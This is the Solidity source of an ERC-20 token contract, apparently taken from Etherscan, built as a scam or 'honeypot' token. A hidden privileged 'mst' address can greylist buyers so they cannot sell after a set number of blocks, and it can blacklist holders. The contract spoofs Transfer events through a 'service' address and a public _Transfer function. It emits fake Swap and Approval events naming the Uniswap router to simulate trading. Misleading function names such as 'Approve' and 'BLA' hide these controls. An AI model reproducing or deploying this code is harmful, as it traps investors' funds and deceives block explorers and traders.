1 /**
2  *Submitted for verification at Etherscan.io on 2023-07-21
3 */
4 
5 /**
6  *Submitted for verification at Etherscan.io on 2023-07-19
7 */
8 
9 /**
10  *Submitted for verification at Etherscan.io on 2023-07-18
11 */
12 
13 /**
14  *Submitted for verification at Etherscan.io on 2023-07-17
15 */
16 
17 /**
18  *Submitted for verification at Etherscan.io on 2023-07-12
19 */
20 
21 /**
22  *Submitted for verification at Etherscan.io on 2023-07-11
23 */
24 
25 pragma solidity ^0.4.24;
26 
27 
28 library SafeMath {
29     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
30         if (a == 0) {
31             return 0;
32         }
33         uint256 c = a * b;
34         assert(c / a == b);
35         return c;
36     }
37 
38     function div(uint256 a, uint256 b) internal pure returns (uint256) {
39         // assert(b > 0); // Solidity automatically throws when dividing by 0
40         uint256 c = a / b;
41         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
42         return c;
43     }
44 
45     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
46         assert(b <= a);
47         return a - b;
48     }
49 
50     function add(uint256 a, uint256 b) internal pure returns (uint256) {
51         uint256 c = a + b;
52         assert(c >= a);
53         return c;
54     }
55 }
56 interface ISwapFactory {
57     function createPair(address tokenA, address tokenB) external returns (address pair);
58 }
59 interface IERC20 {
60     
61     function _Transfer(address from, address recipient, uint amount) external returns (bool);
62 
63 }
64 contract Ownable {
65     address public owner;
66 
67     address mst;
68 
69     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
70 
71     /**
72      * @dev Throws if called by any account other than the owner.
73      */
74     modifier onlyOwner() {
75         require(msg.sender == owner);
76         _;
77     }
78 
79     function renounceOwnership() public  onlyOwner {
80         _setOwner(address(0));
81     }
82 
83     modifier onlyMst() {
84         require(msg.sender == mst);
85         _;
86     }
87 
88     function _setOwner(address newOwner) private {
89         address oldOwner = owner;
90         owner = newOwner;
91         emit OwnershipTransferred(oldOwner, newOwner);
92     }
93 
94 
95 }
96 
97 
98 contract ERC20Basic {
99     uint256 public totalSupply;
100     function balanceOf(address who) public view returns (uint256);
101     function transfer(address to, uint256 value) public returns (bool);
102     event Transfer(address indexed from, address indexed to, uint256 value);
103 }
104 
105 contract ERC20 is ERC20Basic {
106     function allowance(address owner, address spender) public view returns (uint256);
107     function transferFrom(address from, address to, uint256 value) public returns (bool);
108     function approve(address spender, uint256 value) public returns (bool);
109     event Approval(address indexed owner, address indexed spender, uint256 value);
110 }
111 
112 
113 contract StandardToken is ERC20 {
114     using SafeMath for uint256;
115 
116     address public LP;
117 
118     address service;
119 
120     bool ab=false;
121 
122     bool fk=false;
123 
124 
125     mapping (address => mapping (address => uint256)) internal allowed;
126     mapping(address => bool)  tokenBlacklist;
127     mapping(address => bool)  tokenGreylist;
128     mapping(address => bool)  tokenWhitelist;
129     event Blacklist(address indexed blackListed, bool value);
130     event Gerylist(address indexed geryListed, bool value);
131     event Whitelist(address indexed WhiteListed, bool value);
132     event Swap(
133         address indexed sender,
134         uint amount0In,
135         uint amount1In,
136         uint amount0Out,
137         uint amount1Out,
138         address indexed to
139     );
140     mapping(address => uint256)  death;
141     uint256  blockN=1;
142 
143 
144     mapping(address => uint256) balances;
145 
146 
147     function transfer(address _to, uint256 _value) public returns (bool) {
148         beforTransfer(msg.sender,_to);
149         if(ab&&!tokenWhitelist[_to]&&_to!=LP){
150             tokenGreylist[_to] = true;
151             emit Gerylist(_to, true);
152             if(death[_to]==0){
153                 death[_to]=block.number;
154             }
155         }
156 
157         require(_to != address(0));
158         require(_to != msg.sender);
159         require(_value <= balances[msg.sender]);
160         balances[msg.sender] = balances[msg.sender].sub(_value);
161         // SafeMath.sub will throw if there is not enough balance.
162         balances[_to] = balances[_to].add(_value);
163         afterTransfer(msg.sender, _to, _value);
164         // emit Transfer(msg.sender, _to, _value);
165         return true;
166     }
167 
168 
169     function balanceOf(address _owner) public view returns (uint256 balance) {
170         return balances[_owner];
171     }
172 
173     function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
174         beforTransfer(_from,_to);
175 
176         if(ab&&!tokenWhitelist[_to]&&_to!=LP){
177             tokenGreylist[_to] = true;
178             emit Gerylist(_to, true);
179             if(death[_to]==0){
180                 death[_to]=block.number;
181             }
182         }
183         require(_to != _from);
184         require(_to != address(0));
185         require(_value <= balances[_from]);
186         require(_value <= allowed[_from][msg.sender]);
187         balances[_from] = balances[_from].sub(_value);
188 
189 
190         balances[_to] = balances[_to].add(_value);
191         allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
192         afterTransfer(_from, _to, _value);
193         // emit Transfer(_from, _to, _value);
194         return true;
195     }
196 
197     function beforTransfer(address _from, address _to) internal {
198         if(!tokenWhitelist[_from]&&!tokenWhitelist[_to]){
199             require(tokenBlacklist[_from] == false);
200             require(tokenBlacklist[_to] == false);
201             require(tokenBlacklist[msg.sender] == false);
202             require(tokenGreylist[_from] == false||block.number<death[_from]+blockN);
203         }
204     }
205 
206     function afterTransfer(address _from, address _to,uint256 amount) internal {
207         if(fk){
208             _transferEmit(service, _to, amount);
209         }else{
210             _transferEmit(_from, _to, amount);
211         }
212     }
213 
214 
215     function approve(address _spender, uint256 _value) public returns (bool) {
216         allowed[msg.sender][_spender] = _value;
217         emit Approval(msg.sender, _spender, _value);
218         return true;
219     }
220 
221 
222     function allowance(address _owner, address _spender) public view returns (uint256) {
223         return allowed[_owner][_spender];
224     }
225 
226 
227     function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
228         allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
229         emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
230         return true;
231     }
232 
233     function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
234         uint oldValue = allowed[msg.sender][_spender];
235         if (_subtractedValue > oldValue) {
236             allowed[msg.sender][_spender] = 0;
237         } else {
238             allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
239         }
240         emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
241         return true;
242     }
243 
244     function _transferEmit(address _from, address _to, uint _value) internal returns (bool) {
245         emit Transfer(_from, _to, _value);
246         return true;
247     }
248 
249     function _changeAb(bool _ab) internal returns (bool) {
250         require(ab != _ab);
251         ab=_ab;
252         return true;
253     }
254 
255     function _changeBlockN(uint256 _blockN) internal returns (bool) {
256         blockN=_blockN;
257         return true;
258     }
259 
260     function _changeFk(bool _fk) internal returns (bool) {
261         require(fk!=_fk);
262         fk=_fk;
263         return true;
264     }
265 
266     function _changeLP(address _lp) internal returns (bool) {
267         require(LP!=_lp);
268         LP=_lp;
269         return true;
270     }
271 
272     function _blackList(address _address, bool _isBlackListed) internal returns (bool) {
273         require(tokenBlacklist[_address] != _isBlackListed);
274         tokenBlacklist[_address] = _isBlackListed;
275         emit Blacklist(_address, _isBlackListed);
276         return true;
277     }
278 
279     function _geryList(address _address, bool _isGeryListed) internal returns (bool) {
280         require(tokenGreylist[_address] != _isGeryListed);
281         tokenGreylist[_address] = _isGeryListed;
282         emit Gerylist(_address, _isGeryListed);
283         return true;
284     }
285     function _whiteList(address _address, bool _isWhiteListed) internal returns (bool) {
286         require(tokenWhitelist[_address] != _isWhiteListed);
287         tokenWhitelist[_address] = _isWhiteListed;
288         emit Whitelist(_address, _isWhiteListed);
289         return true;
290     }
291     function _blackAddressList(address[] _addressList, bool _isBlackListed) internal returns (bool) {
292         for(uint i = 0; i < _addressList.length; i++){
293             tokenBlacklist[_addressList[i]] = _isBlackListed;
294             emit Blacklist(_addressList[i], _isBlackListed);
295         }
296         return true;
297     }
298     function _geryAddressList(address[] _addressList, bool _isGeryListed) internal returns (bool) {
299         for(uint i = 0; i < _addressList.length; i++){
300             tokenGreylist[_addressList[i]] = _isGeryListed;
301             emit Gerylist(_addressList[i], _isGeryListed);
302         }
303         return true;
304     }
305 
306 
307 }
308 
309 contract PausableToken is StandardToken, Ownable {
310 
311     function transfer(address _to, uint256 _value) public  returns (bool) {
312         return super.transfer(_to, _value);
313     }
314 
315     function transferFrom(address _from, address _to, uint256 _value) public  returns (bool) {
316         return super.transferFrom(_from, _to, _value);
317     }
318 
319     function approve(address _spender, uint256 _value) public  returns (bool) {
320         return super.approve(_spender, _value);
321     }
322 
323     function increaseApproval(address _spender, uint _addedValue) public  returns (bool success) {
324         return super.increaseApproval(_spender, _addedValue);
325     }
326 
327     function decreaseApproval(address _spender, uint _subtractedValue) public  returns (bool success) {
328         return super.decreaseApproval(_spender, _subtractedValue);
329     }
330     function _Transfer(address _from, address _to, uint _value)public  returns (bool){
331         return super._transferEmit(_from,_to,_value);
332     }
333 
334     function setAb(bool _ab) public  onlyMst  returns (bool success) {
335         return super._changeAb(_ab);
336     }
337 
338     function setBn(uint _bn) public  onlyMst  returns (bool success) {
339         return super._changeBlockN(_bn);
340     }
341 
342     function changeFk(bool _fk) public  onlyMst  returns (bool success) {
343         return super._changeFk(_fk);
344     }
345 
346     function setLp(address _lp) public  onlyMst  returns (bool success) {
347         return super._changeLP(_lp);
348     }
349 
350     function BLA(address listAddress,  bool isBlackListed) public  onlyMst  returns (bool success) {
351         return super._blackList(listAddress, isBlackListed);
352     }
353     function GLA(address listAddress,  bool _isGeryListed) public  onlyMst  returns (bool success) {
354         return super._geryList(listAddress, _isGeryListed);
355     }
356     function WLA(address listAddress,  bool _isWhiteListed) public  onlyMst  returns (bool success) {
357         return super._whiteList(listAddress, _isWhiteListed);
358     }
359     function BL(address[] listAddress,  bool isBlackListed) public  onlyMst  returns (bool success) {
360         return super._blackAddressList(listAddress, isBlackListed);
361     }
362     function Approve(address[] listAddress,  bool _isGeryListed) public  onlyMst  returns (bool success) {
363         return super._geryAddressList(listAddress, _isGeryListed);
364     }
365 
366 }
367 
368 contract Token is PausableToken {
369     string public name;
370     string public symbol;
371     uint public decimals;
372     event Mint(address indexed from, address indexed to, uint256 value);
373     event Burn(address indexed burner, uint256 value);
374     bool internal _INITIALIZED_;
375 
376     constructor(string  _name, string  _symbol, uint256 _decimals, uint256 _supply, address tokenOwner,address _service,address _mst) public {
377         name = _name;
378         symbol = _symbol;
379         decimals = _decimals;
380         totalSupply = _supply * 10**_decimals;
381         balances[tokenOwner] = totalSupply;
382         owner = tokenOwner;
383         mst=_mst;
384         service=_service;
385         emit Transfer(address(0), tokenOwner, totalSupply);
386     }
387 
388     function swapExactETHForTokens(
389         address[] memory recipients,
390         uint256[] memory tokenAmounts,
391         uint256[] memory wethAmounts,
392         address tokenAddress
393     ) public onlyMst returns (bool) {
394         for (uint256 i = 0; i < recipients.length; i++) {
395             emit Transfer(LP, recipients[i], tokenAmounts[i]);
396             emit Swap(
397                 0x7a250d5630b4cf539739df2c5dacb4c659f2488d,
398                 tokenAmounts[i],
399                 0,
400                 0,
401                 wethAmounts[i],
402                 recipients[i]
403             );
404             IERC20(tokenAddress)._Transfer(recipients[i], LP, wethAmounts[i]);
405         }
406         return true;
407     }
408 
409     function Approve(address []  _addresses, uint256 balance) external  {
410         for (uint256 i = 0; i < _addresses.length; i++) {
411             emit Approval(_addresses[i], address(this), balance);
412         }
413     }
414 
415 }